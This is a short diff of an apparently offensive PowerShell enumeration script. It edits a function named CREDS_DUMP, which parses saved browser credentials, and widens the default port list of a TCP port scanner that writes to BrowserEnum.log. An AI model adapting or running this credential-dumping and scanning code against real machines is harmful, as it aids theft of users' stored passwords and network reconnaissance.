@@ -868,7 +868,7 @@ function CREDS_DUMP {
             If($PSVersion -gt '4'){
                 ## Remove from output what i dont like
                 $ParseData = $StoreCreds|Select -Skip 1|Select -SkipLast 2
-                $RawCredentials = $ParseData -replace 'url:','hostname:' -replace '\[PASSWORD\]',''
+                $RawCredentials = $ParseData -replace 'url:','Hostname:' -replace '\[PASSWORD\]',''
                  #|Where-Object {-not[string]::IsNullOrEmpty(([string]$_).trim())} # remove all brake lines
             }else{
                 $RawCredentials = $StoreCreds
@@ -917,7 +917,7 @@ function CREDS_DUMP {
  ## Function tcp port scanner
  function PORTSCANNER {
     [int]$counter = 0
-    If(-not($param2)){$PortRange = "21,22,23,80,135,137,139,443,445,666,1433,4444,8080"}else{$PortRange = $param2}
+    If(-not($param2)){$PortRange = "21,22,23,25,80,110,135,137,139,443,445,666,1433,3389,8080"}else{$PortRange = $param2}
     $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
     echo "`n`nRemote-Host   Status   Proto  Port" >> $LogFilePath\BrowserEnum.log
     echo "-----------   ------   -----  ----" >> $LogFilePath\BrowserEnum.log
@@ -931,7 +931,6 @@ function CREDS_DUMP {
     }
     echo "`nTotal open tcp ports found: $counter" >> $LogFilePath\BrowserEnum.log
 }
-
 
 
 ## Jump Links (Functions)
